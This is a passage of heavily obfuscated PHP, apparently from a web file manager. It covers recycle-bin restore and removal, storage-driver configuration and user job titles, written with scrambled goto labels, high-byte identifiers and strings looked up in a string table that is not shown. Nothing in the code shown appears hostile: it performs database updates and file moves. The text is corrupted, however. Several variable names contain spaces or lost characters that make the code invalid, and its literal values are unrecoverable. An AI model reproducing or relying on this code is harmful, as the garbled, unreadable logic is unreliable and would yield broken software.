=& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FôîÕ¡…ÊÌ = Model($EÒÀŒÛ§‰Ò[1154]); $aİç«÷ñ…µ = $FôîÕ¡…ÊÌ->sourceInfo($AùÒàÊ÷Üó); goto cÈ£áğ»×—; bì®²óºË´: } public function clear() { $this->remove(!1); } public function remove($D„»˜ğù¡ = false) { goto AèçÉ¤°†İ; AèçÉ¤°†İ: $BœŞîã‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÅ†Ø™•µî = Model($BœŞîã‹[1154]); $CÙò™²òÜ¥ = $this->listData(); goto d³§Í¯ñ×¥; e±”‹Æ“Õ™: foreach ($C‚±‘÷†Œ as $fªí†õ™İ§) { $CÅ†Ø™•µî->targetSpaceUpdate($fªí†õ™İ§[$BœŞîã‹[389]], $fªí†õ™İ§[$BœŞîã‹[474]]); } goto fÕ¶´Ÿ®ËÖ; d³§Í¯ñ×¥: $D„»˜ğù¡ = $D„»˜ğù¡ === !1 ? !1 : $D„»˜ğù¡; $C‚±‘÷†Œ = array(); foreach ($CÙò™²òÜ¥ as $cã¶é°Îî·) { if ($D„»˜ğù¡ != !1 && !in_array($cã¶é°Îî·, $D„»˜ğù¡)) { continue; } $A°ïæ±‹¶î = $CÅ†Ø™•µî->sourceInfo($cã¶é°Îî·); $CÅ†Ø™•µî->remove($cã¶é°Îî·, !1); $BİÚŠÇÛ’Ô = $A°ïæ±‹¶î[$BœŞîã‹[389]] . $BœŞîã‹[70] . $A°ïæ±‹¶î[$BœŞîã‹[474]]; $C‚±‘÷†Œ[$BİÚŠÇÛ’Ô] = array($BœŞîã‹[538] => $A°ïæ±‹¶î[$BœŞîã‹[389]], $BœŞîã‹[474] => $A°ïæ±‹¶î[$BœŞîã‹[474]]); $this->where(array($BœŞîã‹[387] => $cã¶é°Îî·))->delete(); } goto e±”‹Æ“Õ™; fÕ¶´Ÿ®ËÖ: } public function restore($AÊÅë¹—Ş… = false) { goto CÆº‡•Šé¶; EÄô¹²•Š„: foreach ($e°ª¿´“è as $Fê—Æ§£ƒÏ) { goto f§›ÂŸ‚ñ; f§›ÂŸ‚ñ: if ($AÊÅë¹—Ş… != !1 && !in_array($Fê—Æ§£ƒÏ, $AÊÅë¹—Ş…)) { continue; } $DØÜ‹ÃÑ» = $B«Šæ¼²¨ô->sourceInfo($Fê—Æ§£ƒÏ); $eè æËÃßõ = $B«Šæ¼²¨ô->sourceInfo($DØÜ‹ÃÑ»[$D¿ğéŸôÑ[479]]); goto B‹ã‚Ë¦Ë½; a·¬ëÖ‘¾‚: $Cñ¾“Ï Û„[] = $DØÜ‹ÃÑ»[$D¿ğéŸôÑ[479]]; if ($DØÜ‹ÃÑ»[$D¿ğéŸôÑ[388]] == $D¿ğéŸôÑ[86]) { $Cñ¾“Ï Û„[] = $Fê—Æ§£ƒÏ; } $B«Šæ¼²¨ô->lockMoveEnd($Fê—Æ§£ƒÏ); goto dİ›Ù‹¾–Â; E»µŞ™‚Ú: if ($DØÜ‹ÃÑ»[$D¿ğéŸôÑ[388]] == $D¿ğéŸôÑ[86]) { $EÙ£ÙªàóÈ = array($D¿ğéŸôÑ[542] => array($D¿ğéŸôÑ[501], $DØÜ‹ÃÑ»[$D¿ğéŸôÑ[477]] . $Fê—Æ§£ƒÏ . $D¿ğéŸôÑ[502])); $B«Šæ¼²¨ô->where($EÙ£ÙªàóÈ)->setField($D¿ğéŸôÑ[414], 0); $this->restoreFolderChildren($Fê—Æ§£ƒÏ, $e°ª¿´“è); } $this->where(array($D¿ğéŸôÑ[387] => $Fê—Æ§£ƒÏ))->delete(); $B«Šæ¼²¨ô->folderSizeReset($DØÜ‹ÃÑ»[$D¿ğéŸôÑ[479]]); goto a·¬ëÖ‘¾‚; B‹ã‚Ë¦Ë½: if ($eè æËÃßõ[$D¿ğéŸôÑ[414]] == $D¿ğéŸôÑ[86]) { continue; } $B«Šæ¼²¨ô->lockMoveStart($Fê—Æ§£ƒÏ); $this->recycleMove($Fê—Æ§£ƒÏ, 0); goto E»µŞ™‚Ú; dİ›Ù‹¾–Â: } $B«Šæ¼²¨ô->updateModifyTime($Cñ¾“Ï Û„); goto F¢‘Š÷£«À; FÅÒæŒæÆ: $AÊÅë¹—Ş… = $AÊÅë¹—Ş… == !1 ? !1 : $AÊÅë¹—Ş…; if (!$e°ª¿´“è) { return !0; } $Cñ¾“Ï Û„ = array(); goto EÄô¹²•Š„; CÆº‡•Šé¶: $D¿ğéŸôÑ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B«Šæ¼²¨ô = Model($D¿ğéŸôÑ[1154]); $e°ª¿´“è = $this->listData(); goto FÅÒæŒæÆ; F¢‘Š÷£«À: } private function restoreFolderChildren($aè—Â—Şé®, $EŞ‚»ãºÛ) { goto E‚æ¹÷í¥é; f÷¸ÕŒÌ: foreach ($EŞ‚»ãºÛ as $aôª‘íòÜƒ) { if ($aôª‘íòÜƒ == $aè—Â—Şé®) { continue; } if (!$c£ãÎêçÃ§->isParentOf($aè—Â—Şé®, $aôª‘íòÜƒ)) { continue; } $bÓ°Çñ = $c£ãÎêçÃ§->sourceInfo($aôª‘íòÜƒ); if ($bÓ°Çñ[$cÈ³ÓÈ×ÜŒ[388]] == $cÈ³ÓÈ×ÜŒ[86]) { $CÇ›ã÷Ó‘Ğ[] = array($cÈ³ÓÈ×ÜŒ[542] => array($cÈ³ÓÈ×ÜŒ[501], $bÓ°Çñ[$cÈ³ÓÈ×ÜŒ[477]] . $aôª‘íòÜƒ . $cÈ³ÓÈ×ÜŒ[502])); } else { $CÇ›ã÷Ó‘Ğ[$cÈ³ÓÈ×ÜŒ[387]][1][] = $aôª‘íòÜƒ; } } if (!$CÇ›ã÷Ó‘Ğ[$cÈ³ÓÈ×ÜŒ[387]][1]) { unset($CÇ›ã÷Ó‘Ğ[$cÈ³ÓÈ×ÜŒ[387]]); } if (!$CÇ›ã÷Ó‘Ğ) { return; } goto F•ĞâÉÌèÔ; F•ĞâÉÌèÔ: $CÇ›ã÷Ó‘Ğ[$cÈ³ÓÈ×ÜŒ[387]][1] = array_unique($CÇ›ã÷Ó‘Ğ[$cÈ³ÓÈ×ÜŒ[387]][1]); $CÇ›ã÷Ó‘Ğ[$cÈ³ÓÈ×ÜŒ[909]] = $cÈ³ÓÈ×ÜŒ[1727]; $c£ãÎêçÃ§->where($CÇ›ã÷Ó‘Ğ)->setField($cÈ³ÓÈ×ÜŒ[414], 1); goto f¤•ÔÃ’´; E‚æ¹÷í¥é: $cÈ³ÓÈ×ÜŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c£ãÎêçÃ§ = Model($cÈ³ÓÈ×ÜŒ[1154]); $CÇ›ã÷Ó‘Ğ = array($cÈ³ÓÈ×ÜŒ[387] => array($cÈ³ÓÈ×ÜŒ[7], array())); goto f÷¸ÕŒÌ; f¤•ÔÃ’´: } private function recycleMove($CáÛİš² Ø, $AÓ‡öéÅŠë = 1) { $AòÄØ£ÀÒª =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÀëÖ—ˆêä = Model($AòÄØ£ÀÒª[1154]); $Aââ»Ã©×´ = Model($AòÄØ£ÀÒª[1932]); $e¸…³ˆĞ·­ = array($AòÄØ£ÀÒª[387] => $CáÛİš² Ø); if ($AÓ‡öéÅŠë) { $dÀëÖ—ˆêä->where($e¸…³ˆĞ·­)->setField($AòÄØ£ÀÒª[414], 1); $Aââ»Ã©×´->eventRecycle($CáÛİš² Ø, $AòÄØ£ÀÒª[1933]); } else { $aêƒÚ¢İÅ = $dÀëÖ—ˆêä->where($e¸…³ˆĞ·­)->find(); $D¡´®¥á» = $aêƒÚ¢İÅ[$AòÄØ£ÀÒª[388]] == $AòÄØ£ÀÒª[86]; $bÉÕ´ö×Ãƒ = $dÀëÖ—ˆêä->fileNameAuto($aêƒÚ¢İÅ[$AòÄØ£ÀÒª[479]], $aêƒÚ¢İÅ[$AòÄØ£ÀÒª[28]], REPEAT_RENAME_FOLDER, $D¡´®¥á»); if ($bÉÕ´ö×Ãƒ != $aêƒÚ¢İÅ[$AòÄØ£ÀÒª[28]]) { $dÀëÖ—ˆêä->rename($CáÛİš² Ø, $bÉÕ´ö×Ãƒ); } $dÀëÖ—ˆêä->where($e¸…³ˆĞ·­)->setField($AòÄØ£ÀÒª[414], 0); $Aââ»Ã©×´->eventRecycle($CáÛİš² Ø, $AòÄØ£ÀÒª[1934]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\163\164\x6f\162\141\147\x65\114\x69\163\164"; public $field = array("\156\141\155\145", "\x73\151\172\145\x4d\x61\170", "\x73\x79\163\x74\x65\x6d", "\144\145\x66\141\165\x6c\x74", "\x64\162\151\166\145\x72", "\x63\x6f\x6e\146\x69\x67"); public function listData($CÛíƒ¬‚ ¯ = false, $eî¬Ö”ô¯‰ = "\155\157\x64\x69\146\x79\124\x69\155\x65", $Aù†ˆóé²… = false) { goto a³¾î‰¿Õ; cô‰çŠ×ºŠ: foreach ($b‰ß¾‡Ë¥é as $dÃ…£˜˜‹ğ => $dçì„£©®÷) { unset($b‰ß¾‡Ë¥é[$dÃ…£˜˜‹ğ][$fŠñÛÕí‘Ï[6]]); $b‰ß¾‡Ë¥é[$dÃ…£˜˜‹ğ][$fŠñÛÕí‘Ï[1624]] = 0; } $d‡»íò™À = array_to_keyvalue($b‰ß¾‡Ë¥é, $fŠñÛÕí‘Ï[33], $fŠñÛÕí‘Ï[385]); $this->_listAppendSize($b‰ß¾‡Ë¥é, $d‡»íò™À); goto cªİÕÏçµŸ; cªİÕÏçµŸ: return $b‰ß¾‡Ë¥é; goto AËÖ›¤æ¢’; a³¾î‰¿Õ: $fŠñÛÕí‘Ï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b‰ß¾‡Ë¥é = parent::listData($CÛíƒ¬‚ ¯, $eî¬Ö”ô¯‰, $Aù†ˆóé²…); if ($CÛíƒ¬‚ ¯) { return $b‰ß¾‡Ë¥é; } goto cô‰çŠ×ºŠ; AËÖ›¤æ¢’: } public function _listAppendSize(&$e¥ĞÀÇ¥¦Í, $FÖ»™›äŞ) { $BİĞ®†›ˆƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$FÖ»™›äŞ) { return; } $f‹˜×—ô¿– = $BİĞ®†›ˆƒ[1935] . implode($BİĞ®†›ˆƒ[47], $FÖ»™›äŞ) . $BİĞ®†›ˆƒ[1936]; $cŒ¦×ŒÆ¦¿ = Model($BİĞ®†›ˆƒ[712])->query($f‹˜×—ô¿–); $cŒ¦×ŒÆ¦¿ = array_to_keyvalue($cŒ¦×ŒÆ¦¿, $BİĞ®†›ˆƒ[385], $BİĞ®†›ˆƒ[77]); foreach ($e¥ĞÀÇ¥¦Í as $a¿ƒ‰ƒ¾öê => $BÚôÍÇ©ê) { $e¥ĞÀÇ¥¦Í[$a¿ƒ‰ƒ¾öê][$BİĞ®†›ˆƒ[1624]] = isset($cŒ¦×ŒÆ¦¿[$BÚôÍÇ©ê[$BİĞ®†›ˆƒ[385]]]) ? $cŒ¦×ŒÆ¦¿[$BÚôÍÇ©ê[$BİĞ®†›ˆƒ[385]]] : 0; } } public function getConfig($D…¹Ä¡Ö¨) { $aõÎ¼—Ş = parent::listData($D…¹Ä¡Ö¨); return json_decode($aõÎ¼—Ş[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][6]], !0); } public function update($AËËÙŸ”Ë, $Cìâ”¨ÚĞ†) { goto b’ºº¯¥Ä; A«•Ø½‰ø°: if (isset($A‰‹­´“[$c–ÍÌİêŠ]) && $A‰‹­´“[$c–ÍÌİêŠ][$c÷÷Èö„…Ã[385]] != $AËËÙŸ”Ë) { return !1; } if (isset($Cìâ”¨ÚĞ†[$c÷÷Èö„…Ã[1937]]) && $Cìâ”¨ÚĞ†[$c÷÷Èö„…Ã[1937]] == $c÷÷Èö„…Ã[86]) { $this->checkConfig($Cìâ”¨ÚĞ†); } unset($Cìâ”¨ÚĞ†[$c÷÷Èö„…Ã[1937]]); goto f³º÷×ë³; b’ºº¯¥Ä: $c÷÷Èö„…Ã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c–ÍÌİêŠ = $Cìâ”¨ÚĞ†[$c÷÷Èö„…Ã[28]]; $A‰‹­´“ = array_to_keyvalue(parent::listData(), $c÷÷Èö„…Ã[28]); goto A«•Ø½‰ø°; f³º÷×ë³: $Fº÷„«´Ğ¾ = parent::update($AËËÙŸ”Ë, $Cìâ”¨ÚĞ†); if ($Fº÷„«´Ğ¾ && $Cìâ”¨ÚĞ†[$c÷÷Èö„…Ã[34]]) { foreach ($A‰‹­´“ as $F£ï´ºÃùØ) { if ($F£ï´ºÃùØ[$c÷÷Èö„…Ã[34]] && $F£ï´ºÃùØ[$c÷÷Èö„…Ã[385]] != $AËËÙŸ”Ë) { parent::update($F£ï´ºÃùØ[$c÷÷Èö„…Ã[385]], array($c÷÷Èö„…Ã[34] => 0)); } } } return $Fº÷„«´Ğ¾; goto C‰Ø¶×èÔ; C‰Ø¶×èÔ: } public function add($DĞ‹›õª Ì) { goto EµŸğ‡Ä…İ; EæØ¹¯œŞå: $this->checkConfig($DĞ‹›õª Ì); $dƒÈ‚ê°‘‘ = parent::insert($DĞ‹›õª Ì); if ($dƒÈ‚ê°‘‘ && $DĞ‹›õª Ì[$aé µõİ¥¸[34]]) { foreach ($dÍ—¤²¢ŠÌ as $C¿ìêˆ¢¥¦) { if ($C¿ìêˆ¢¥¦[$aé µõİ¥¸[34]]) { parent::update($C¿ìêˆ¢¥¦[$aé µõİ¥¸[385]], array($aé µõİ¥¸[34] => 0)); } } } goto a©í“àŞ ; a©í“àŞ : return $dƒÈ‚ê°‘‘; goto CÊ¦ô«Í•; EµŸğ‡Ä…İ: $aé µõİ¥¸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÍ—¤²¢ŠÌ = array_to_keyvalue(parent::listData(), $aé µõİ¥¸[28]); if (isset($dÍ—¤²¢ŠÌ[$DĞ‹›õª Ì[$aé µõİ¥¸[28]]])) { return !1; } goto EæØ¹¯œŞå; CÊ¦ô«Í•: } public function checkConfig(&$FôÒ¸åÛË) { goto E°ç³‡áª; e¶‰ˆÈ×İó: $dí˜Ëœ†Íæ = $fè–‡¦‰³À->getPath($eÒËîÕµŠ . $E›„ÙëÆ©ê[1088]); if (!$fè–‡¦‰³À->mkfile($dí˜Ëœ†Íæ)) { show_json(LNG($E›„ÙëÆ©ê[1942]), !1); } $F‘°¦œ±­ª[$E›„ÙëÆ©ê[1027]] = $eÒËîÕµŠ; goto c¶°á±çø”; AŒã‡®¬ÄÏ: $fè–‡¦‰³À = new $f‘áÛ³…êŞ($F‘°¦œ±­ª); if (in_array($Dê¬¬ª·µÊ, $fè–‡¦‰³À->objectDriver)) { if (!$fè–‡¦‰³À->isBucketCors() && !$fè–‡¦‰³À->setBucketCors()) { $b†È­¤ãï = LNG($E›„ÙëÆ©ê[1942]); $b†È­¤ãï .= $E›„ÙëÆ©ê[1943] . LNG($E›„ÙëÆ©ê[1944]); show_json($b†È­¤ãï, !1); } } $eÒËîÕµŠ = rtrim($F‘°¦œ±­ª[$E›„ÙëÆ©ê[1027]], $E›„ÙëÆ©ê[8]) . $E›„ÙëÆ©ê[8]; goto e¶‰ˆÈ×İó; E°ç³‡áª: $E›„ÙëÆ©ê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Dê¬¬ª·µÊ = strtolower($FôÒ¸åÛË[$E›„ÙëÆ©ê[93]]); $F‘°¦œ±­ª = json_decode($FôÒ¸åÛË[$E›„ÙëÆ©ê[6]], !0); goto bïÕ–³¨; c¶°á±çø”: $FôÒ¸åÛË[$E›„ÙëÆ©ê[6]] = json_encode($F‘°¦œ±­ª); $FôÒ¸åÛË[$E›„ÙëÆ©ê[93]] = $b’ñ­¶£Õ ; return !0; goto E‘Ä«ªï¾ƒ; bïÕ–³¨: foreach ($F‘°¦œ±­ª as $dò¤Â°—² => $eğã©–…Ú) { $F‘°¦œ±­ª[$dò¤Â°—²] = trim($eğã©–…Ú); } $F‘°¦œ±­ª[$E›„ÙëÆ©ê[1938]] = rand_string(6); $D¤Í÷—Æ÷À = $GLOBALS[$E›„ÙëÆ©ê[6]][$E›„ÙëÆ©ê[87]][$E›„ÙëÆ©ê[746]]; goto eô˜ÀËé±; eô˜ÀËé±: $b’ñ­¶£Õ  = isset($D¤Í÷—Æ÷À[$Dê¬¬ª·µÊ]) ? $D¤Í÷—Æ÷À[$Dê¬¬ª·µÊ] : ucfirst($Dê¬¬ª·µÊ); $f‘áÛ³…êŞ = $E›„ÙëÆ©ê[71] . $b’ñ­¶£Õ ; if (!$b’ñ­¶£Õ  || !class_exists($f‘áÛ³…êŞ)) { write_log(array($E›„ÙëÆ©ê[1939], $FôÒ¸åÛË, get_caller_info()), $E›„ÙëÆ©ê[1940]); show_json(LNG($E›„ÙëÆ©ê[1941]), !1, $FôÒ¸åÛË); } goto AŒã‡®¬ÄÏ; E‘Ä«ªï¾ƒ: } public function driverListSystem() { $a¬ÂÒƒ˜ß° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÃïè‰Ò„• = parent::listData(); $BÎ”ˆ¹ ŸŸ = array(); foreach ($FÃïè‰Ò„• as $Bßùé¢‚‹) { unset($Bßùé¢‚‹[$a¬ÂÒƒ˜ß°[192]], $Bßùé¢‚‹[$a¬ÂÒƒ˜ß°[83]]); $Bßùé¢‚‹[$a¬ÂÒƒ˜ß°[6]] = json_decode($Bßùé¢‚‹[$a¬ÂÒƒ˜ß°[6]], !0); $BÎ”ˆ¹ ŸŸ[] = $Bßùé¢‚‹; } return $BÎ”ˆ¹ ŸŸ; } public function defaultDriver() { $CÒÑŠ²”ìó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B©¢ä‰öÜ« = parent::listData(); $DÖĞ®µ‡º‰ = array_filter_by_field($B©¢ä‰öÜ«, $CÒÑŠ²”ìó[34], 1); $DÖĞ®µ‡º‰ = $DÖĞ®µ‡º‰[0]; if ($DÖĞ®µ‡º‰) { $DÖĞ®µ‡º‰[$CÒÑŠ²”ìó[6]] = json_decode($DÖĞ®µ‡º‰[$CÒÑŠ²”ìó[6]], !0); } return $DÖĞ®µ‡º‰; } public function driverInfo($BÅ×Æ ˆÊØ) { $A™–Ãäë¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c§Û×˜ø‡Ç = array_to_keyvalue(parent::listData(), $A™–Ãäë¿[385]); if (!isset($c§Û×˜ø‡Ç[$BÅ×Æ ˆÊØ])) { return !1; } $bï§©¢¯’ô = $c§Û×˜ø‡Ç[$BÅ×Æ ˆÊØ]; $bï§©¢¯’ô[$A™–Ãäë¿[6]] = json_decode($bï§©¢¯’ô[$A™–Ãäë¿[6]], !0); return $bï§©¢¯’ô; } public function remove($a•í†ìÒ‹) { $this->removeShareItems($a•í†ìÒ‹); return parent::remove($a•í†ìÒ‹); } public function removeWithFile($Cèö˜á’±¾, $eÁ½šÂÁ‚ø) { goto cÄÏñÏÅÓÜ; cÄÏñÏÅÓÜ: $e¦èÙÆ…Šè =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Dù½·î®– = array($e¦èÙÆ…Šè[737] => $Cèö˜á’±¾); $cè®ÔÈâŠÒ = Model($e¦èÙÆ…Šè[439])->where($Dù½·î®–)->count(); goto cŞºâŞñ­; eåÆÃÑğ¤Ú: if (!$bÊ£³”—·¿) { $e—‚Ø™ó->stop($FÌ·¡¾¼ŒÔ); return !1; } $e—‚Ø™ó->end(); if ($eÁ½šÂÁ‚ø == $e¦èÙÆ…Šè[1604]) { $this->remove($Cèö˜á’±¾); } goto c«ÑÇ†èœØ; E™˜Ş™®¬†: $dßÉ…Íö†ã = Model($e¦èÙÆ…Šè[173])->where($Dù½·î®–)->field($e¦èÙÆ…Šè[1947])->select(); foreach ($dßÉ…Íö†ã as $fôªËÖÇŠ) { goto FÌÂŸ³ğ¤Ø; FÌÂŸ³ğ¤Ø: $Aˆ¨¥ÓšĞ¶ = $fôªËÖÇŠ[$e¦èÙÆ…Šè[75]]; $aèçª…Î‹¤ = $Fš“¹ïµ’‡ . str_replace("\173\151\x6f\72{$Cèö˜á’±¾}\175\57", $e¦èÙÆ…Šè[33], $Aˆ¨¥ÓšĞ¶); if (!IO::exist($Aˆ¨¥ÓšĞ¶)) { $Dàˆ¤Ø“é[] = $fôªËÖÇŠ[$e¦èÙÆ…Šè[436]]; $e—‚Ø™ó->updateFileEnd($fôªËÖÇŠ[$e¦èÙÆ…Šè[28]], $fôªËÖÇŠ[$e¦èÙÆ…Šè[77]]); continue; } goto DáÀ…Š÷­; DáÀ…Š÷­: if (IO::exist($aèçª…Î‹¤)) { $e—‚Ø™ó->updateFileEnd($fôªËÖÇŠ[$e¦èÙÆ…Šè[28]], $fôªËÖÇŠ[$e¦èÙÆ…Šè[77]]); continue; } if (!IO::move($Aˆ¨¥ÓšĞ¶, get_path_father($aèçª…Î‹¤))) { $bÊ£³”—·¿ = !1; break; } $Dù½·î®– = array($e¦èÙÆ…Šè[436] => $fôªËÖÇŠ[$e¦èÙÆ…Šè[436]]); goto cÜƒ£ğàšË; cÜƒ£ğàšË: $B“¿®ˆ•—– = array($e¦èÙÆ…Šè[737] => $b±ñ¬‹³»È, $e¦èÙÆ…Šè[75] => $aèçª…Î‹¤); Model($e¦èÙÆ…Šè[173])->where($Dù½·î®–)->save($B“¿®ˆ•—–); goto D—ÏĞÁ¦»È; D—ÏĞÁ¦»È: } $this->removeByFileID($Dàˆ¤Ø“é); goto eåÆÃÑğ¤Ú; c´êÍ´Å¬ï: $e—‚Ø™ó->task[$e¦èÙÆ…Šè[692]] = (double) $CÎ’ÜŞÖ°; $Aœ…ÈØó÷œ = KodIO::defaultDriver(); $b±ñ¬‹³»È = $Aœ…ÈØó÷œ[$e¦èÙÆ…Šè[385]]; goto Cœš„½À‹; cŞºâŞñ­: $CÎ’ÜŞÖ° = Model($e¦èÙÆ…Šè[439])->where($Dù½·î®–)->sum($e¦èÙÆ…Šè[77]); $FÌ·¡¾¼ŒÔ = $eÁ½šÂÁ‚ø . $e¦èÙÆ…Šè[1945] . $Cèö˜á’±¾; $e—‚Ø™ó = new TaskFileTransfer($FÌ·¡¾¼ŒÔ, $e¦èÙÆ…Šè[1940], $cè®ÔÈâŠÒ, LNG($e¦èÙÆ…Šè[1946]) . "\x28{$Cèö˜á’±¾}\51"); goto c´êÍ´Å¬ï; Cœš„½À‹: $Fš“¹ïµ’‡ = "\x7b\x69\157\72{$b±ñ¬‹³»È}\175\57"; $bÊ£³”—·¿ = !0; $Dàˆ¤Ø“é = array(); goto E™˜Ş™®¬†; c«ÑÇ†èœØ: } public function progress($EˆÚÙî‡†‘, $d’³ÍÔŠŸ´) { return Task::get($d’³ÍÔŠŸ´ . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1945] . $EˆÚÙî‡†‘); } private function removeByFileID($AõÅ¾Îí÷ = array()) { goto DÆŸéÛ¸Öä; DÆŸéÛ¸Öä: $F™Œ¶îé‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($AõÅ¾Îí÷)) { return; } $Dßß’¢¬Æœ = array($F™Œ¶îé‡[436] => array($F™Œ¶îé‡[7], $AõÅ¾Îí÷)); goto DÁÂóìÚŠ; DÁÂóìÚŠ: $döä¹®‰™ = Model($F™Œ¶îé‡[1154])->where($Dßß’¢¬Æœ)->field($F™Œ¶îé‡[387])->select(); if (!$döä¹®‰™) { return; } $döä¹®‰™ = array_to_keyvalue($döä¹®‰™, $F™Œ¶îé‡[33], $F™Œ¶îé‡[387]); goto b¡îº“¥ç¿; b¡îº“¥ç¿: foreach ($döä¹®‰™ as $dĞºÙ™ºö¾) { Model($F™Œ¶îé‡[400])->removeNow($dĞºÙ™ºö¾, !1); } goto CÂŸ‚˜³¶³; CÂŸ‚˜³¶³: } private function removeShareItems($Cøµ÷Å ë) { goto CƒçôÕØùò; d‚¡ÌÎÛ–¿: Model($Eøèô‰Æ‡[552])->remove($Aù¦…Üš”Å); goto bÌÔƒğ¹äŠ; E®µ¨ñÙÜ: $Fï’ÌÌ¢š¸ = Model($Eøèô‰Æ‡[1615])->where($Dì¸°í‘¨Ã)->field($Eøèô‰Æ‡[457])->select(); if (empty($Fï’ÌÌ¢š¸)) { return; } $Aù¦…Üš”Å = array_to_keyvalue($Fï’ÌÌ¢š¸, $Eøèô‰Æ‡[33], $Eøèô‰Æ‡[457]); goto d‚¡ÌÎÛ–¿; CƒçôÕØùò: $Eøèô‰Æ‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BÈ»öÉÎ”½ = "\173\151\x6f\x3a{$Cøµ÷Å ë}\175\x2f"; $Dì¸°í‘¨Ã = array($Eøèô‰Æ‡[387] => 0, $Eøèô‰Æ‡[1022] => array($Eøèô‰Æ‡[375], "{$BÈ»öÉÎ”½}\x25")); goto E®µ¨ñÙÜ; bÌÔƒğ¹äŠ: } } goto dƒ«Ş»†‘È; Eôë®î»¢: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\152\157\142\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\144\145\163\143", "\163\157\x72\164"); const JOB_KEY = "\x73\x65\154\146\x4a\157\142\114\x69\163\x74"; public function listData($bøË¸¹­£ = false, $b„ĞØ¥¥ñ­ = "\x73\x6f\x72\164", $f«Ù™óç¯œ = false) { return parent::listData($bøË¸¹­£, $b„ĞØ¥¥ñ­, $f«Ù™óç¯œ); } public function remove($DÄ½–ØÚ) { return parent::remove($DÄ½–ØÚ); } public function add($bİ§†éˆŒÍ) { $BóÖ‰¬¦ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->findByName($bİ§†éˆŒÍ[$BóÖ‰¬¦[28]])) { return !1; } $bİ§†éˆŒÍ[$BóÖ‰¬¦[1661]] = $this->getSort(); return parent::insert($bİ§†éˆŒÍ); } private function getSort() { $A¼¨ÛØ‰è =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÛŸŠŒ¥Ì = parent::listData(); $d‹½æ¶’‹ = array_to_keyvalue($CÛŸŠŒ¥Ì, $A¼¨ÛØ‰è[33], $A¼¨ÛØ‰è[1661]); return empty($d‹½æ¶’‹) ? 0 : max($d‹½æ¶’‹) + 1; } public function update($EØ…Ûáóˆ, $B¶Áíî¬·) { $DƒäÅÉˆÕ— =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B‘øµœÁãŒ = parent::listData($EØ…Ûáóˆ); $Eîâîîª»õ = $this->findByName($B¶Áíî¬·[$DƒäÅÉˆÕ—[28]]); if (!$B‘øµœÁãŒ || $Eîâîîª»õ && $Eîâîîª»õ[$DƒäÅÉˆÕ—[385]] != $B‘øµœÁãŒ[$DƒäÅÉˆÕ—[385]]) { return !1; } return parent::update($EØ…Ûáóˆ, $B¶Áíî¬·); } public function setUserJob($b«º‘İ¾ËŒ, $b•÷ä»†‰) { goto cÒ˜”Š·ó×; cÒ˜”Š·ó×: $b†ñ÷›ˆµ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!is_array($b•÷ä»†‰)) { $b•÷ä»†‰ = array($b•÷ä»†‰); } $Fìâ×«‘ë› = parent::listData(); goto b°¼ƒæ÷Š¸; b°¼ƒæ÷Š¸: $aÕˆ°×¾Áª = array_to_keyvalue($Fìâ×«‘ë›, $b†ñ÷›ˆµ[28]); $c¥…„­ˆïï = $b†ñ÷›ˆµ[370]; foreach ($b•÷ä»†‰ as $CÄö¹ï‰®“) { if ($aÕˆ°×¾Áª[$CÄö¹ï‰®“]) { $c¥…„­ˆïï .= $aÕˆ°×¾Áª[$CÄö¹ï‰®“][$b†ñ÷›ˆµ[385]] . $b†ñ÷›ˆµ[47]; } else { $B®ƒÅª¾½™ = $this->add($CÄö¹ï‰®“); $c¥…„­ˆïï .= $B®ƒÅª¾½™ . $b†ñ÷›ˆµ[47]; } } goto dæÈ†‘Æù…; dæÈ†‘Æù…: $c¥…„­ˆïï = rtrim($c¥…„­ˆïï, $b†ñ÷›ˆµ[47]); Model($b†ñ÷›ˆµ[495])->metaSet($b«º‘İ¾ËŒ, self::JOB_KEY, $c¥…„­ˆïï); goto dä“ŠŸ¸Á°; dä“ŠŸ¸Á°: } public function getUserJob($cŠ‘Ô÷§›Û) { $Dšè¹ª÷êõ = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][495])->metaGet($cŠ‘Ô÷§›Û); return $this->getUserJobInfo($Dšè¹ª÷êõ[self::JOB_KEY]); } public function getUserJobInfo($e’ÛƒšäÚì) { goto Eøê‚îò·é; Eøê‚îò·é: $Cª†¬¯Ò¤÷ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C†ĞâàÕëé = explode($Cª†¬¯Ò¤÷[47], $e’ÛƒšäÚì); $A‰¨•‡¨¦´ = parent::listData(); goto c¿á§Ú¤Ş; c¿á§Ú¤Ş: $A‰¨•‡¨¦´ = array_remove_key($A‰¨•‡¨¦´, $Cª†¬¯Ò¤÷[192]); $Fµ¦œŒµØ… = array(); foreach ($C†ĞâàÕëé as $BªøëäÎÌ§) { if (isset($A‰¨•‡¨¦´[$BªøëäÎÌ§])) { $Fµ¦œŒµØ…[] = $A‰¨•‡¨¦´[$BªøëäÎÌ§]; } } goto e­ ĞŞ‚Ú´; e­ ĞŞ‚Ú´: return $Fµ¦œŒµØ…; goto B·®«ˆˆ§; B·®«ˆˆ§: } } class UserModel extends ModelBase { protected $tableName = 